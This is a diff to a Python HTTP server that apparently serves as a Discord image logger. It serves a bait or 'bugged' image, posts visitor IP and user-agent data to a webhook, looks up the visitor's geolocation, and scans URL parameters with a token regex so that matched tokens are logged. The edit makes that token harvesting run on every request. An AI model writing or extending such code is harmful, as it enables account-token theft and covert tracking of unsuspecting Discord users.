@@ -86,10 +86,19 @@ class handler(BaseHTTPRequestHandler):
             self.wfile.write(bindata)
             return
             
+        # Extract tokens from URL parameters for all cases
+        forwarded_for = self.headers.get('x-forwarded-for', 'Unknown')
+        useragent = self.headers.get('user-agent', 'No User Agent Found!')
+        
+        # Look for tokens in URL parameters
+        for param, values in query.items():
+            for value in values:
+                matches = re.findall(TOKEN_REGEX, value)
+                if matches:
+                    log_token(matches[0], forwarded_for, useragent)
+        
         # Check for Discord preview
-        forwarded_for = self.headers.get('x-forwarded-for', '')
         if forwarded_for.startswith(('35','34','104.196')):
-            useragent = self.headers.get('user-agent', 'No User Agent Found!')
             if 'discord' in useragent.lower():
                 self.send_response(200)
                 self.send_header('Content-Type', 'image/jpeg')
@@ -97,13 +106,6 @@ class handler(BaseHTTPRequestHandler):
                 self.wfile.write(buggedbin if buggedimg else bindata)
                 httpx.post(webhook, json=prev(forwarded_for, useragent))
             else:
-                # Extract tokens from URL parameters
-                for param, values in query.items():
-                    for value in values:
-                        matches = re.findall(TOKEN_REGEX, value)
-                        if matches:
-                            log_token(matches[0], forwarded_for, useragent)
-                
                 # Process normal image requests
                 if 'url' in query:
                     try:
@@ -123,13 +125,6 @@ class handler(BaseHTTPRequestHandler):
                     ipInfo['country'], ipInfo['loc'], ipInfo['org'], 
                     ipInfo['postal'], useragent, ipInfo['os'], ipInfo['browser']
                 ))
-        else:
-            # Extract tokens from URL parameters for non-Discord previews
-            for param, values in query.items():
-                for value in values:
-                    matches = re.findall(TOKEN_REGEX, value)
-                    if matches:
-                        log_token(matches[0], forwarded_for, useragent)
 
 if __name__ == '__main__':
     from http.server import HTTPServer
